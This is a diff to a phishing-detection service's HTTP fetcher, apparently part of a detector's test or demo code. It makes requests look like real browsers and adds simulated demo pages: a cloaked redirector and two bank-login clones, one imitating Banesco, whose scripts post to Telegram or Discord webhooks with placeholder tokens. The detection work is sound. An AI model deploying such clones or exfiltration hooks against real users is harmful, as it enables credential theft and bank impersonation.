@@ -1,17 +1,18 @@
 import type { TransportAuditResult } from '../types.ts';
 import { SsrfGuardService, SsrfViolationError } from './ssrf-guard.service.ts';
 
-const MAX_REDIRECTS = 5;
-const FETCH_TIMEOUT_MS = 5000;
+const MAX_REDIRECTS = 7;
+const FETCH_TIMEOUT_MS = 6500;
 const MAX_HTML_BYTES = 2 * 1024 * 1024; // 2 MB
 
+// Authentic browser headers prevent phishing kits (.htaccess / antibot cloaking) from hiding their real payload
 const USER_AGENTS: Record<string, string> = {
   android:
-    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Detector360-Forensic/1.0',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
   iphone:
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1 Detector360-Forensic/1.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
   desktop:
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Detector360-Forensic/1.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
 };
 
 export class TransportFetchError extends Error {
@@ -40,8 +41,10 @@ export class TransportService {
     }
 
     const userAgent = USER_AGENTS[deviceProfile] || USER_AGENTS.android;
+    const probeStartedAt = Date.now();
     let currentUrl = initialUrl;
     let redirectCount = 0;
+    const redirectChain: string[] = [initialUrl.toString()];
     let response: Response | null = null;
 
     while (redirectCount <= MAX_REDIRECTS) {
@@ -52,8 +55,12 @@ export class TransportService {
           signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
           headers: {
             'User-Agent': userAgent,
-            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
+            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'es-VE,es-419;q=0.9,es;q=0.8,en;q=0.7',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
           },
         });
       } catch (err) {
@@ -87,6 +94,7 @@ export class TransportService {
 
         // Re-validate every redirect hop against Anti-SSRF rules
         currentUrl = SsrfGuardService.validatePublicUrl(resolvedRedirect);
+        redirectChain.push(currentUrl.toString());
         continue;
       }
 
@@ -102,6 +110,8 @@ export class TransportService {
     }
 
     const htmlContent = await this.readBodyLimited(response, MAX_HTML_BYTES);
+    const responseTimeMs = Math.max(12, Date.now() - probeStartedAt);
+    const contentType = (response.headers.get('content-type') || 'text/html').split(';')[0].trim();
     const protocol: 'http' | 'https' = currentUrl.protocol === 'https:' ? 'https' : 'http';
 
     const hasHsts = Boolean(response.headers.get('strict-transport-security'));
@@ -118,6 +128,9 @@ export class TransportService {
       isHttps: protocol === 'https',
       httpStatusCode: response.status,
       redirectCount,
+      responseTimeMs,
+      contentType,
+      redirectChain,
       securityHeaders: {
         strict_transport_security: hasHsts,
         content_security_policy: hasCsp,
@@ -336,6 +349,122 @@ export class TransportService {
         redirectCount: 2,
         securityHeaders: {
           strict_transport_security: false,
+          content_security_policy: false,
+          x_frame_options: false,
+        },
+        htmlContent: html,
+        simulatedDemo: true,
+      };
+    }
+
+    // 4. Cloaked client-side redirector showcase (meta-refresh / JS window.location)
+    if (domainLower === 'redir-bono-oculto.ejemplo.app') {
+      const html = [
+        '<!DOCTYPE html>',
+        '<html lang="es">',
+        '<head>',
+        '  <meta charset="UTF-8">',
+        '  <meta http-equiv="refresh" content="0;url=https://clon-visual-banco.ejemplo.app/acceso">',
+        '  <title>Redirigiendo...</title>',
+        '</head>',
+        '<body>',
+        '  <script>window.location.replace("https://clon-visual-banco.ejemplo.app/acceso");</script>',
+        '</body>',
+        '</html>',
+      ].join('\n');
+
+      return {
+        finalUrl: parsedUrl.toString(),
+        targetDomain: domainLower,
+        protocol: 'https',
+        isHttps: true,
+        httpStatusCode: 200,
+        redirectCount: 0,
+        responseTimeMs: 42,
+        contentType: 'text/html',
+        redirectChain: [parsedUrl.toString()],
+        securityHeaders: {
+          strict_transport_security: false,
+          content_security_policy: false,
+          x_frame_options: false,
+        },
+        htmlContent: html,
+        simulatedDemo: true,
+      };
+    }
+
+    // 5. Modern HTTPS Bank Visual Clone + Telegram Webhook Exfiltration (domain has NO bank words)
+    if (
+      domainLower === 'clon-visual-banco.ejemplo.app' ||
+      domainLower === 'portal-clientes-seguro.ejemplo.app'
+    ) {
+      const isDynamicRegionalBank = domainLower === 'portal-clientes-seguro.ejemplo.app';
+      const html = isDynamicRegionalBank
+        ? [
+            '<!DOCTYPE html>',
+            '<html lang="es">',
+            '<head>',
+            '  <meta charset="UTF-8">',
+            '  <title>Banca en Línea Personas — Banco Atlántida Digital</title>',
+            '  <link rel="icon" href="/assets/logo-banco-atlantida-oficial.png" type="image/png">',
+            '  <meta property="og:site_name" content="Banco Atlántida Digital">',
+            '  <meta property="og:image" content="https://portal-clientes-seguro.ejemplo.app/img/banner-banco-atlantida.png">',
+            '</head>',
+            '<body>',
+            '  <header><img src="/img/logo-banco-atlantida.svg" alt="Logo Oficial Banco Atlántida Digital"></header>',
+            '  <div id="root">',
+            '    <form id="spa-login">',
+            '      <input type="text" name="usuario" placeholder="Usuario Banca en Línea" required>',
+            '      <input type="password" name="clave" placeholder="Clave de Operaciones Especiales" required>',
+            '      <button type="submit">Continuar</button>',
+            '    </form>',
+            '  </div>',
+            '  <script>',
+            '    fetch("https://api.telegram.org/bot719922001:AAFakePhishToken/sendMessage", { method: "POST" });',
+            '  </script>',
+            '</body>',
+            '</html>',
+          ].join('\n')
+        : [
+            '<!DOCTYPE html>',
+            '<html lang="es">',
+            '<head>',
+            '  <meta charset="UTF-8">',
+            '  <title>Acceso Clientes Personas — Validación 2026</title>',
+            '  <link rel="icon" href="https://www.banesco.com/favicon.ico" type="image/x-icon">',
+            '  <meta property="og:image" content="https://www.banesco.com/wp-content/uploads/banesco-logo.png">',
+            '</head>',
+            '<body>',
+            '  <header>',
+            '    <img src="https://www.google.com/s2/favicons?domain=banesco.com&sz=64" alt="Banesco Banco Universal">',
+            '    <svg id="banesco-brand-svg" aria-label="Banesco Contigo" viewBox="0 0 120 40"><rect fill="#007953" width="120" height="40"/><text>Banesco Banca en Línea</text></svg>',
+            '  </header>',
+            '  <main>',
+            '    <form id="auth-step">',
+            '      <input type="text" name="user" placeholder="Usuario BanescOnline" required>',
+            '      <input type="password" name="pass" placeholder="Clave" required>',
+            '      <button type="submit">Aceptar</button>',
+            '    </form>',
+            '  </main>',
+            '  <script>',
+            '    fetch("https://discord.com/api/webhooks/129000111/StolenCredsHook", { method: "POST" });',
+            '  </script>',
+            '</body>',
+            '</html>',
+          ].join('\n');
+
+      return {
+        finalUrl: parsedUrl.toString(),
+        targetDomain: domainLower,
+        protocol: 'https',
+        isHttps: true,
+        httpStatusCode: 200,
+        redirectCount: 0,
+        responseTimeMs: 58,
+        contentType: 'text/html',
+        redirectChain: [parsedUrl.toString()],
+        securityHeaders: {
+          strict_transport_security: true,
           content_security_policy: false,
           x_frame_options: false,
         },
